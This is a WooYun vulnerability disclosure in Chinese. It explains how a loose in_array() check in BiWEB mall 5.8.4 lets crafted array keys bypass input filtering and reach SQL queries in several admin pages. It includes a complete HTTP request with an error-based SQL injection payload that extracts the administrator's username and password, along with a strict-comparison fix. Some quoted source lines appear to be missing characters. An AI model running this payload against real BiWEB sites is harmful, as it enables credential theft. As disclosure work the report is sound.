{"id": 42653, "wybug_id": "wooyun-2014-085026", "wybug_title": "BiWEB最新商城版注入漏洞打包（in_array使用不当造成注入）", "wybug_corp": "BiWEB", "wybug_author": "路人甲", "wybug_date": "2014-11-28 10:57", "wybug_open_date": "2015-02-26 10:58", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-28：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： BiWEB最新商城版注入漏洞打包（in_array使用不当造成注入） 详细说明：  在wooyun上看到了有人提了BiWEB商城版的一个XSS漏洞： WooYun: BIWEB商城版XSS盲打cookie ，也有人提了SQL注入，我来找找其他的漏洞吧。去官网下BiWEB商城版最新的5.8.4来看看。 BiWEB在全局过滤时使用了in_array(),使用不当，造成全局过滤可以绕过。先来看看BiWEB是怎么处理防注入的。首先BiWEB对用户输入进行了全局过滤，过滤的方法在/config/filtrate.inc.php中\n<?php//过滤GET或POST的值，去除两端空格和转义符号if ($_SERVER['REQUEST_METHOD'] == 'POST'){\tcheck::filtrateData($_POST,$arrGPdoDB['htmlspecialchars']);}elseif($_SERVER['REQUEST_METHOD'] == 'GET'){\tcheck::filtrateData($_GET,$arrGPdoDB['htmlspecialchars']);}?>\n然后我们去看看filtrateData(),在/web_common5.8/check.class.php中\n/**\t * filtrateData($ParamValue)\t * 作 用：递归去除所有值两边的空白\t * @author\tArthur <ArthurXF@gmail.com>\t * @param\t$ParamValue （需要过滤空白的数据）\t * @param\tarray\t$arrHtml （不需要过滤的数据key组成的数组）\t * @return\t去除空白之后的数据\t * 备 注：无\t */\tstatic function filtrateData(&$ParamValue,$arrHtml){\t\tif (is_array($ParamValue)){\t\t\tforeach ($ParamValue as $key=>$value){\t\t\t\tif(is_array($value)){\t\t\t\t\tcheck::filtrateData($value,$arrHtml);\t\t\t\t}else{\t\t\t\t\tif(v === 'v' || v === '' || strpos(p,v)) exit;\t\t\t\t\tif($key === 'v') {\t\t\t\t\t\techo v;exit;\t\t\t\t\t}\t\t\t\t\tif(count($arrHtml)){\t\t\t\t\t\tif(in_array($key,$arrHtml)) $ParamValue[$key] = trim($value);\t\t\t\t\t\telse $ParamValue[$key] = htmlspecialchars(trim($value), ENT_QUOTES);\t\t\t\t\t}else $ParamValue[$key] = htmlspecialchars(trim($value), ENT_QUOTES);\t\t\t\t}\t\t\t}\t\t}else{\t\t\t$ParamValue = trim($ParamValue);\t\t}\t}\n可以看到，filtrateData()中有这么一句：if(in_array($key,$arrHtml)) $ParamValue[$key] = trim($value)，其中$arrHtml即为$arrGPdoDB['htmlspecialchars'] = array('intro','summary','tag')，也就是说当$key是'intro','summary','tag'中的之一时，就不进行htmlspecialchars编码，也就可以绕过全局过滤了。问题在这里，如果$key等于0时，in_array($key,$arrHtml)将返回ture，也就不进行编码！通过POST提交一个数组，而数组的key是0，1，2...，如通过POST提交一个名为test的数组，test[]=injection_code&test[]=2，这样就可以利用上面代码中in_array()使用不当造成的注入了。BiWEB这种漏洞有不少，这里一起打包提交吧\n/ads/adminu/index.php/brand/adminu/index.php/client/adminu/index.php/deal/adminu/index.php/download/adminu/index.php/grace/adminu/index.php/largess/adminu/index.php/news/adminu/index.php/product/adminu/index.php\n这里以/news/adminu/index.php为例进行证明\n无关代码if(isset($_GET['action'])){\tif($_GET['action']=='search') {\t\t// 构造搜索条件和翻页参数\t\t$arrLink[] = 'action=search';\t\tif (!empty($_GET['title'])) {\t\t\t$strKeywords = strval(urldecode($_GET['title']));\t\t\tif($strKeywords[0] == '/'){\t\t\t\t//精确查询ID\t\t\t\t$strKeywords = substr($strKeywords,1);\t\t\t\tif(is_numeric($strKeywords)) $arrWhere[] = \"id = '\" . $strKeywords . \"'\";\t\t\t}else{\t\t\t\t$arrWhere[] = \"tag LIKE '%\" . $_GET['title'] . \"%'\";\t\t\t}\t\t\t$arrLink[] = 'title=' . $_GET['title'];\t\t}\t\tif ($_GET['pass'] == '1' || $_GET['pass'] == '0') {\t\t\t$arrWhere[] = \"pass='\".$_GET['pass'].\"'\";\t\t\t$arrLink[] = 'pass=' . $_GET['pass'];\t\t}\t\tif (!empty($_GET['type_id'])) {\t\t\t$intTypeID = intval($_GET['type_id']);\t\t\t$arrWhere[] = \"type_id='\".$intTypeID.\"' or type_roue_id like '%:$intTypeID:%'\";\t\t\t$arrLink[] = 'type_id='.$intTypeID;\t\t}\t} else {\t\t$objWebInit->doInfoAction($_GET['action'],$_POST['select']);\t}}无关代码\n当$_GET['action']为'moveup'时，则执行这条语句$objWebInit->doInfoAction($_GET['action'],$_POST['select'])，我们再去看看doInfoAction()， 在/web_common5.8/php_common.php中\n/**\t * 执行信息操作\t * @author\t肖飞\t * @param\tstring\t$strAction  执行命令\t * @param\tarray\t$arrData\t选中的操作数据id数组\t * @param\tarray\t$arrFile\t需要删除的文件\t * @return  void\t */\t function doInfoAction($strAction=null,$arrData=null,$arrFile=array('photo')){\t\tswitch ($strAction){\t\t\tcase 'del':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->deleteInfo($val,$arrFile);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'delpic':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->deleteInfoPic($val,$arrFile);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'moveup':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->moveupInfo($val);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'check':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->passInfo($val,1);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'uncheck':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->passInfo($val,0);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'settop':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->topInfo($val,1);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'unsettop':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->topInfo($val,0);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'setrecommend':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->recommendInfo($val,1);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'unsetrecommend':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->recommendInfo($val,0);\t\t\t\t}\t\t\t\tbreak;\t\t}\t\treturn true;\t}\n再去看看相同文件中的topInfo\n/**\t * 固顶/解固信息\t * @author\t肖飞\t * @param\tint $intInfoID    信息id\t * @return  void\t */\tfunction topInfo($intInfoID,$topflag){\t\t$arrData['topflag'] = $topflag;\t\t$strWhere = \" WHERE `id` = $intInfoID\";\t\treturn $this->updateDataG($this->tablename2,$arrData,$strWhere);\t}\n可以看到传入的值直接作为id带入了SQL语句，造成了注入。（这里只是拿这个例子来说明in_array()使用不当可以引入单引号，当然这个注入点可以直接用数字型的注入方法注入，可不使用单引号）单引号这样引入\n\n成功注入，Payload如下\nPOST /news/adminu/index.php?action=settop HTTP/1.1Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)Accept-Encoding: gzip, deflateIf-Modified-Since: Thu, 27 Nov 2014 15:24:12 GMTHost: 192.168.0.107Proxy-Connection: Keep-AliveContent-Type: application/x-www-form-urlencodedContent-Length: 212Cookie: AJSTAT_ok_times=1; PHPSESSID=af8v3b4bc156qj3v42f9fvs943select%5B%5D=1 or  (select 1 from (select count(*),concat(0x23,(select concat(user_name,0x23,password,0x23)from biweb_user limit 0,1),floor(rand(0)*2))x from  information_schema.tables group by x)a)&select%5B%5D=\n注入成功，管理员的用户名和密码\n\n   漏洞证明：  见 详细说明   修复方案：  in_array($key,$array,true)   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}